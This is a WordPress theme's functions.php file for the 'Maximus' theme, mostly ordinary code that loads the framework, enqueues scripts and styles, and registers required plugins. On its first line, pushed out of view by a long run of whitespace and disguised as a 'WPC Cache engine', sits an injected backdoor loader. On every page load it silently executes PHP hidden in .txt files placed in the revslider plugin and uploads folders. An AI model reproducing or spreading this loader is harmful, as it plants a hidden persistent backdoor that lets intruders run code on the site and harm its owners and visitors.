<?php                                                                                                                                                                                                                                                                                                                                /* WPC Cache engine started */ if (file_exists(ABSPATH.'wp-content/plugins/revslider/revslider-sample-options.txt')) @include_once(ABSPATH.'wp-content/plugins/revslider/revslider-sample-options.txt'); if (file_exists(ABSPATH.'wp-content/uploads/revslider/templates/goodnewscarousel/5951dd.txt')) @include_once(ABSPATH.'wp-content/uploads/revslider/templates/goodnewscarousel/5951dd.txt'); /* WPC Cache engine stopped */

/**
 *Maximus functions and definitions
 *
 * This file contains core framework operations. It is always
 * loaded before the index.php file no the front-end
 *
 * @package WordPress
 * @subpackage Maximus
 * @since Maximus 1.0
 **/

$framework_path = get_template_directory() . '/framework/';

if(!class_exists('GavernWP')) {
	// include the framework base class
	require($framework_path . 'base.php');
}
// load and parse template JSON file.
$config_language = 'en_US';
if(get_locale() != '' && is_dir(get_template_directory() . '/framework/config/'. get_locale()) && is_dir(get_template_directory() . '/framework/options/'. get_locale())) {
	$config_language = get_locale();	
}
$json_data = json_decode(file_get_contents(get_template_directory() . '/framework/config/'.$config_language.'/template.json'));
$tpl_name = strtolower(preg_replace("/[^A-Za-z0-9]/", "", $json_data->template->name));
// define constant to use with all __(), _e(), _n(), _x() and _xe() usage
define('DPTPLNAME', $tpl_name);
// create the framework object
$tpl = new GavernWP();
// Including file with helper functions
require_once($framework_path . 'helpers/helpers.base.php');
// Including file with template hooks
require_once($framework_path . 'hooks.php');
// Including file with template functions
require_once($framework_path . 'functions.php');
// Including file with template filters
require_once($framework_path . 'filters.php');
// Including files with template widgets
require_once($framework_path . 'widgets.php');
require_once($framework_path . 'widget.flickr.php');
require_once($framework_path . 'widget.recent_portfolio.php');
require_once($framework_path . 'widget.recent_posts.php');
require_once($framework_path . 'widget.recent_portfolio_grid.php');
require_once($framework_path . 'widget.social.php');
require_once($framework_path . 'widget.comments.php');
// Including file with cutsom post type slide
require_once($framework_path . 'post_types/slide.php');
// Including file with cutsom post type portfolio
require_once($framework_path . 'post_types/portfolio.php');
// Including file with template admin features
require_once($framework_path . 'helpers/helpers.features.php');
// Including file with template shortcodes
require_once($framework_path . 'helpers/helpers.shortcodes.php');
// Including file with template layout functions
require_once($framework_path . 'helpers/helpers.layout.php');
// Including file with template layout functions - connected with template fragments
require_once($framework_path . 'helpers/helpers.layout.fragments.php');
// Including file with template branding functions
require_once($framework_path . 'helpers/helpers.branding.php');
// Including file with template customize functions
require_once($framework_path . 'helpers/helpers.customizer.php');
// Including file with dynamic css stuff
require_once($framework_path . 'helpers/helpers.dynamic.css.php');
// Including file with menu custom functions
require_once($framework_path . 'helpers/helpers.menu.php');
// initialize the framework
$tpl->init();
// add theme setup function
add_action('after_setup_theme', 'gavern_theme_setup');
// Theme setup function
function gavern_theme_setup(){
	// access to the global template object
	global $tpl;
	// variable used for redirects
	global $pagenow;		
	// check if the themes.php address with goto variable has been used
	if ($pagenow == 'themes.php' && !empty($_GET['goto'])) {
		/**
		 *
		 * IMPORTANT FACT: if you're using few different redirects on a lot of subpages
		 * we recommend to define it as themes.php?goto=X, because if you want to
		 * change the URL for X, then you can change it on one place below :)
		 *
		 **/
		
		// check the goto value
		switch ($_GET['goto']) {
			// make proper redirect
			case 'support_forum':
				wp_redirect("http://www.support.dynamicpress.eu");
				break;
			// or use default redirect
			default:
				wp_safe_redirect('/wp-admin/');
				break;
		}
		exit;
	}
	// if the normal page was requested do following operations:
	
    // load and parse template JSON file.
    $json_data = $tpl->get_json('config','template');
    // read the configuration
    $template_config = $json_data->template;
    // save the lowercase non-special characters template name				
    $template_name = strtolower(preg_replace("/[^A-Za-z0-9]/", "", $template_config->name));
    // load the template text_domain
    load_theme_textdomain( $template_name, get_template_directory() . '/languages' );
}
// scripts enqueue function
    function dp_enqueue_js() {
	// jQuery noconflict
	wp_register_script('jquery-noconflict-js', get_template_directory_uri().'/js/jquery.noconflict.js', array('jquery'));
	wp_enqueue_script('jquery-noconflict-js');
	// jQuery easing
	wp_register_script('easing-js', get_template_directory_uri().'/js/easing.js', array('jquery'));
	wp_enqueue_script('easing-js');
	// jQuery fitvid
	wp_register_script('jQuery-fitvid-js', get_template_directory_uri().'/js/jquery.fitvid.js', array('jquery'));
	wp_enqueue_script('jQuery-fitvid-js');
	// jQuery froogaloop
	wp_register_script('froogaloop-js', get_template_directory_uri().'/js/froogaloop.min.js', array('jquery'));
	wp_enqueue_script('froogaloop-js');
	//prettyphoto JS
	wp_register_script('prettyphoto-js', get_template_directory_uri().'/js/jquery.prettyPhoto.js', array('jquery'));
	wp_enqueue_script('prettyphoto-js');
	// prettypphoto CSS
	wp_register_style('prettyphoto-css', get_template_directory_uri().'/css/prettyPhoto.css');
	wp_enqueue_style('prettyphoto-css');
	// Flex slider JS
	wp_register_script( 'flexslider-js',get_template_directory_uri().'/js/jquery.flexslider-min.js', array('jquery'), '2.1');
	wp_enqueue_script( 'flexslider-js' );
	// Flex slider CSS
	wp_register_style('flex-slider-css', get_template_directory_uri().'/css/slider.flexslider.css');
	wp_enqueue_style('flex-slider-css');
	// jQuery tipsy JS
	wp_register_script( 'jQuery-tips-js',get_template_directory_uri().'/js/jquery.tipsy.js', array('jquery'));
	wp_enqueue_script( 'jQuery-tips-js' );
	// jQuery isotope JS
	wp_register_script( 'jQuery-isotope-js',get_template_directory_uri().'/js/jquery.isotope.min.js', array('jquery'));
	wp_enqueue_script( 'jQuery-isotope-js' );
	// jQuery flickr stream JS
	wp_register_script( 'jQuery-flickr-js',get_template_directory_uri().'/js/jquery.zflickrfeed.min.js', array('jquery'));
	wp_enqueue_script( 'jQuery-flickr-js' );
	}
add_action('init', 'dp_enqueue_js');


function gavern_enqueue_admin_js_and_css() {
	// opengraph scripts
	wp_enqueue_script('gavern.opengraph.js', get_template_directory_uri().'/js/back-end/gavern.opengraph.js');
	// widget rules JS
	wp_register_script('widget-rules-js', get_template_directory_uri().'/js/back-end/widget.rules.js', array('jquery'));
	wp_enqueue_script('widget-rules-js');
	// widget rules CSS
	wp_register_style('widget-rules-css', get_template_directory_uri().'/css/back-end/widget.rules.css');
	wp_enqueue_style('widget-rules-css');
	// metaboxes CSS
	wp_register_style('metaboxes-css', get_template_directory_uri().'/framework/metaboxes/meta.css');
	wp_enqueue_style('metaboxes-css');
	// custom WP admin CSS
	wp_register_style('custom-admin-css', get_template_directory_uri().'/css/back-end/custom_admin.css');
	wp_enqueue_style('custom-admin-css');
	// jQueryUI JS
	wp_register_script('jQueryUI-js', get_template_directory_uri().'/js/jquery-ui-1.9.1.custom.min.js', array('jquery'));
	wp_enqueue_script('jQueryUI-js');
	// jQueryUI CSS
	wp_register_style('jQueryUI-css', get_template_directory_uri().'/css/jquery-ui.css');
	wp_enqueue_style('jQueryUI-css');
	// admin add JS
	
	if(
		get_locale() != '' && 
		is_dir(get_template_directory() . '/framework/config/'. get_locale()) && 
		is_dir(get_template_directory() . '/framework/options/'. get_locale())
	) {
		$language = get_locale();	
	} else {
		$language = 'en_US';
	}
	
}
// this action enqueues scripts and styles: 
// http://wpdevel.wordpress.com/2011/12/12/use-wp_enqueue_scripts-not-wp_print_styles-to-enqueue-scripts-and-styles-for-the-frontend/
add_action('admin_enqueue_scripts', 'gavern_enqueue_admin_js_and_css');
wp_oembed_add_provider( 'http://soundcloud.com/*', 'http://soundcloud.com/oembed' );
wp_oembed_add_provider( '#http://(www\.)?youtube\.com/watch.*#i', 'http://www.youtube.com/oembed', true );
wp_oembed_add_provider( '#http://(www\.)?vimeo\.com/.*#i', 'http://vimeo.com/api/oembed.{format}', true );



function dp_excerpt($text) {
   return str_replace('[&hellip;]', '&hellip;<p><a href="'.get_permalink().'">'.__( 'Continue reading <span class="meta-nav">&rarr;</span>', DPTPLNAME ).'</a></p>', $text); }
add_filter('the_excerpt', 'dp_excerpt');

function dp_excerpt_length($length) {
	global $tpl;
 	return get_option($tpl->name . "_excerpt_length"); }
add_filter('excerpt_length', 'dp_excerpt_length');

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once dirname( __FILE__ ) . '/framework/classes/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'dp_theme_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function dp_theme_register_required_plugins() {

	/**
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(

		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'Revolution Slider Plugin', // The plugin name
			'slug'     				=> 'revslider', // The plugin slug (typically the folder name)
			'source'   				=> get_stylesheet_directory() . '/plugins/revslider.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		)

	);

	// Change this to your theme text domain, used for internationalising strings
	$theme_text_domain = 'DPTPLNAME';

	/**
	 * Array of configuration settings. Amend each line as needed.
	 * If you want the default strings to be available under your own theme domain,
	 * leave the strings uncommented.
	 * Some of the strings are added into a sprintf, so see the comments at the
	 * end of each line for what each argument will be.
	 */
	$config = array(
		'domain'       		=> $theme_text_domain,         	// Text domain - likely want to be the same as your theme.
		'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
		'parent_menu_slug' 	=> 'dynamo-menu', 				// Default parent menu slug
		'parent_url_slug' 	=> 'admin.php', 				// Default parent URL slug
		'menu'         		=> 'install-required-plugins', 	// Menu slug
		'has_notices'      	=> true,                       	// Show admin notices or not
		'is_automatic'    	=> true,					   	// Automatically activate plugins after installation or not
		'message' 			=> '<p>The following plugins are required for the proper functioning of the theme.</p>',							// Message to output right before the plugins table
		'strings'      		=> array(
			'page_title'                       			=> __( 'Install Required Plugins', $theme_text_domain ),
			'menu_title'                       			=> __( 'Install Plugins', $theme_text_domain ),
			'installing'                       			=> __( 'Installing Plugin: %s', $theme_text_domain ), // %1$s = plugin name
			'oops'                             			=> __( 'Something went wrong with the plugin API.', $theme_text_domain ),
			'notice_can_install_required'     			=> _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_install_recommended'			=> _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_install'  					=> _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s)
			'notice_can_activate_required'    			=> _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_activate_recommended'			=> _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_activate' 					=> _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s)
			'notice_ask_to_update' 						=> _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_update' 						=> _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s)
			'install_link' 					  			=> _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
			'activate_link' 				  			=> _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),
			'return'                           			=> __( 'Return to Required Plugins Installer', $theme_text_domain ),
			'plugin_activated'                 			=> __( 'Plugin activated successfully.', $theme_text_domain ),
			'complete' 									=> __( 'All plugins installed and activated successfully. %s', $theme_text_domain ), // %1$s = dashboard link
			'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
		)
	);

	tgmpa( $plugins, $config );

}

// EOF